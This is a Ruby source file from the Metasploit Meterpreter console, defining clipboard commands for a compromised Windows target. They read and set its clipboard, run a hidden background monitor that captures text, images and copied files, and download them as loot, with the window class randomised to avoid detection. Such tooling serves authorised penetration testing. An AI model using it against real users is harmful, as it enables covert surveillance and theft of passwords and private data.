# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui
###
#
# Extended API window management user interface.
#
###
class Console::CommandDispatcher::Extapi::Clipboard

  Klass = Console::CommandDispatcher::Extapi::Clipboard

  include Console::CommandDispatcher

  #
  # List of supported commands.
  #
  def commands
    {
      "clipboard_get_data"       => "Read the target's current clipboard (text, files, images)",
      "clipboard_set_text"       => "Write text to the target's clipboard",
      "clipboard_monitor_start"  => "Start the clipboard monitor",
      "clipboard_monitor_pause"  => "Pause the clipboard monitor (suspends capturing)",
      "clipboard_monitor_resume" => "Resume the paused clipboard monitor (resumes capturing)",
      "clipboard_monitor_dump"   => "Dump all captured content",
      "clipboard_monitor_purge"  => "Delete all captured content without dumping it",
      "clipboard_monitor_stop"   => "Stop the clipboard monitor"
    }
  end

  #
  # Name for this dispatcher
  #
  def name
    "Extapi: Clipboard Management"
  end

  #
  # Options for the clipboard_get_data command.
  #
  @@get_data_opts = Rex::Parser::Arguments.new(
    "-h" => [ false, "Help banner" ],
    "-d" => [ true, "Download non-text content to the specified folder (or current folder)", nil ]
  )

  def print_clipboard_get_data_usage
    print(
      "\nUsage: clipboard_get_data [-h] [-d]\n\n" +
      "Attempts to read the data from the target's clipboard. If the data is in a\n" +
      "supported format, it is read and returned to the user.\n" +
      @@get_data_opts.usage + "\n")
  end

  #
  # Get the data from the target's clipboard
  #
  def cmd_clipboard_get_data(*args)
    download_content = false
    download_path = nil
    @@get_data_opts.parse(args) { |opt, idx, val|
      case opt
      when "-d"
        download_content = true
        download_path = val
      when "-h"
        print_clipboard_get_data_usage
        return true
      end
    }

    dump = client.extapi.clipboard.get_data(download_content)

    if dump.length == 0
      print_error( "The current Clipboard data format is not supported." )
      return false
    end

    parse_dump(dump, download_content, download_content, download_path)
    return true
  end

  #
  # Options for the clipboard_set_text command.
  #
  @@set_text_opts = Rex::Parser::Arguments.new(
    "-h" => [ false, "Help banner" ]
  )

  def print_clipboard_set_text_usage
    print(
      "\nUsage: clipboard_set_text [-h] <text>\n\n" +
      "Set the target's clipboard to the given text value.\n\n")
  end

  #
  # Set the clipboard data to the given text.
  #
  def cmd_clipboard_set_text(*args)
    args.unshift "-h" if args.length == 0

    @@set_text_opts.parse(args) { |opt, idx, val|
      case opt
      when "-h"
        print_clipboard_set_text_usage
        return true
      end
    }

  return client.extapi.clipboard.set_text(args.join(" "))
  end

  #
  # Options for the clipboard_monitor_start command.
  #
  @@monitor_start_opts = Rex::Parser::Arguments.new(
    "-h" => [ false, "Help banner" ],
    "-i" => [ true, "Capture image content when monitoring (default: true)" ]
  )

  #
  # Help for the clipboard_monitor_start command.
  #
  def print_clipboard_monitor_start_usage
    print(
      "\nUsage: clipboard_monitor_start [-i true|false] [-h]\n\n" +
      "Starts a background clipboard monitoring thread. The thread watches\n" +
      "the clipboard on the target, under the context of the current desktop, and when\n" +
      "changes are detected the contents of the clipboard are captured. Contents can be\n" +
      "dumped periodically. Image content can be captured as well (and will be by default)\n" +
      "however this can consume quite a bit of memory.\n\n" +
      @@monitor_start_opts.usage + "\n")
  end

  #
  # Start the clipboard monitor.
  #
  def cmd_clipboard_monitor_start(*args)
    capture_images = true

    @@monitor_start_opts.parse(args) { |opt, idx, val|
      case opt
      when "-i"
        # default this to true
        capture_images = val.downcase != 'false'
      when "-h"
        print_clipboard_monitor_start_usage
        return true
      end
    }

    client.extapi.clipboard.monitor_start({
      # random class and window name so that it isn't easy
      # to track via a script
      :wincls  => Rex::Text.rand_text_alpha(8),
      :cap_img => capture_images
    })

    print_good("Clipboard monitor started")
  end

  #
  # Options for the clipboard_monitor_purge command.
  #
  @@monitor_purge_opts = Rex::Parser::Arguments.new(
    "-h" => [ false, "Help banner" ]
  )

  #
  # Help for the clipboard_monitor_purge command.
  #
  def print_clipboard_monitor_purge_usage
    print("\nUsage: clipboard_monitor_purge [-h]\n\n" +
      "Purge the captured contents from the monitor. This does not stop\n" +
      "the monitor from running, it just removes captured content.\n\n" +
      @@monitor_purge_opts.usage + "\n")
  end

  #
  # Purge the clipboard monitor captured contents
  #
  def cmd_clipboard_monitor_purge(*args)
    @@monitor_purge_opts.parse(args) { |opt, idx, val|
      case opt
      when "-h"
        print_clipboard_monitor_purge_usage
        return true
      end
    }
    client.extapi.clipboard.monitor_purge
    print_good("Captured clipboard contents purged successfully")
  end

  #
  # Options for the clipboard_monitor_dump command.
  #
  @@monitor_dump_opts = Rex::Parser::Arguments.new(
    "-h" => [ false, "Help banner" ],
    "-i" => [ true,  "Indicate if captured image data should be downloaded (default: true)" ],
    "-f" => [ true,  "Indicate if captured file data should be downloaded (default: true)" ],
    "-p" => [ true,  "Purge the contents of the monitor once dumped (default: true)" ],
    "-d" => [ true,  "Download non-text content to the specified folder (or current folder)" ]
  )

  #
  # Help for the clipboard_monitor_dump command.
  #
  def print_clipboard_monitor_dump_usage
    print(
      "\nUsage: clipboard_monitor_dump [-d true|false] [-d downloaddir] [-h]\n\n" +
      "Dump the capture clipboard contents to the local machine..\n\n" +
      @@monitor_dump_opts.usage + "\n")
  end

  #
  # Dump the clipboard monitor contents to the local machine.
  #
  def cmd_clipboard_monitor_dump(*args)
    purge = true
    download_images = true
    download_files = true
    download_path = nil

    @@monitor_dump_opts.parse(args) { |opt, idx, val|
      case opt
      when "-d"
        download_path = val
      when "-i"
        download_images = val.downcase != 'false'
      when "-f"
        download_files = val.downcase != 'false'
      when "-p"
        purge = val.downcase != 'false'
      when "-h"
        print_clipboard_monitor_dump_usage
        return true
      end
    }

    dump = client.extapi.clipboard.monitor_dump({
      :include_images => download_images,
      :purge          => purge
    })

    parse_dump(dump, download_images, download_files, download_path)

    print_good("Clipboard monitor dumped")
  end

  #
  # Options for the clipboard_monitor_stop command.
  #
  @@monitor_stop_opts = Rex::Parser::Arguments.new(
    "-h" => [ false, "Help banner" ],
    "-x" => [ true,  "Indicate if captured clipboard data should be dumped (default: true)" ],
    "-i" => [ true,  "Indicate if captured image data should be downloaded (default: true)" ],
    "-f" => [ true,  "Indicate if captured file data should be downloaded (default: true)" ],
    "-d" => [ true,  "Download non-text content to the specified folder (or current folder)" ]
  )

  #
  # Help for the clipboard_monitor_stop command.
  #
  def print_clipboard_monitor_stop_usage
    print(
      "\nUsage: clipboard_monitor_stop [-d true|false] [-x true|false] [-d downloaddir] [-h]\n\n" +
      "Stops a clipboard monitor thread and returns the captured data to the local machine.\n\n" +
      @@monitor_stop_opts.usage + "\n")
  end

  #
  # Stop the clipboard monitor.
  #
  def cmd_clipboard_monitor_stop(*args)
    dump_data = true
    download_images = true
    download_files = true
    download_path = nil

    @@monitor_stop_opts.parse(args) { |opt, idx, val|
      case opt
      when "-d"
        download_path = val
      when "-x"
        dump_data = val.downcase != 'false'
      when "-i"
        download_images = val.downcase != 'false'
      when "-f"
        download_files = val.downcase != 'false'
      when "-h"
        print_clipboard_monitor_stop_usage
        return true
      end
    }

    dump = client.extapi.clipboard.monitor_stop({
      :dump           => dump_data,
      :include_images => download_images
    })

    parse_dump(dump, download_images, download_files, download_path) if dump_data

    print_good("Clipboard monitor stopped")
  end

private

  def download_file( dest_folder, source )
    stat = client.fs.file.stat( source )
    base = ::Rex::Post::Meterpreter::Extensions::Stdapi::Fs::File.basename( source )
    dest = File.join( dest_folder, base )

    if stat.directory?
      client.fs.dir.download( dest, source, true, true ) { |step, src, dst|
        print_line( "#{step.ljust(11)}: #{src} -> #{dst}" )
        client.framework.events.on_session_download( client, src, dest ) if msf_loaded?
      }
    elsif stat.file?
      client.fs.file.download( dest, source ) { |step, src, dst|
        print_line( "#{step.ljust(11)}: #{src} -> #{dst}" )
        client.framework.events.on_session_download( client, src, dest ) if msf_loaded?
      }
    end
  end

  def parse_dump(dump, get_images, get_files, download_path)
    loot_dir = download_path || "."
    if not ::File.directory?( loot_dir )
      ::FileUtils.mkdir_p( loot_dir )
    end

    dump.each do |r|
      case r[:type]
      when :text
        print_line

        r[:data].each do |x|
          title = "Text captured at #{x[:ts]}"
          under = "-" * title.length
          print_line(title)
          print_line(under)
          print_line(x[:text])
          print_line(under)
          print_line
        end

      when :jpg
        print_line

        table = Rex::Ui::Text::Table.new(
          'Header'    => 'Clipboard Images',
          'Indent'    => 0,
          'SortIndex' => 0,
          'Columns'   => [
            'Time Captured', 'Width', 'Height'
          ]
        )

        r[:data].each do |x|
          table << [x[:ts], x[:width], x[:height]]
        end

        print_line
        print_line(table.to_s)

        if get_images
          print_line
          print_status( "Downloading Clipboard Images ..." )
          r[:data].each do |j|
            file = "#{j[:ts].gsub(/\D+/, '')}-#{Rex::Text.rand_text_alpha(8)}.jpg"
            path = File.join( loot_dir, file )
            path = ::File.expand_path( path )
            ::File.open( path, 'wb' ) do |x|
              x.write j[:data]
            end
            print_good( "Clipboard image #{j[:width]}x#{j[:height]} saved to #{path}" )
          end
        else
          print_line( "Re-run with -d to download image(s)." )
        end
        print_line

      when :files
        print_line

        table = Rex::Ui::Text::Table.new(
          'Header'    => 'Clipboard Files',
          'Indent'    => 0,
          'SortIndex' => 0,
          'Columns'   => [
            'Time Captured', 'File Path', 'Size (bytes)'
          ]
        )

        total = 0
        r[:data].each do |x|
          table << [x[:ts], x[:name], x[:size]]
          total += x[:size]
        end

        print_line
        print_line(table.to_s)

        print_line( "#{r[:data].length} file(s) totalling #{total} bytes" )

        if get_files
          loot_dir = ::File.expand_path( loot_dir )
          print_line
          print_status( "Downloading Clipboard Files ..." )
          r[:data].each do |f|
            download_file( loot_dir, f[:name] )
          end
          print_good( "Downloaded #{r[:data].length} file(s)." )
        else
          print_line( "Re-run with -d to download file(s)." )
        end
      end
    end
  end

end

end
end
end
end

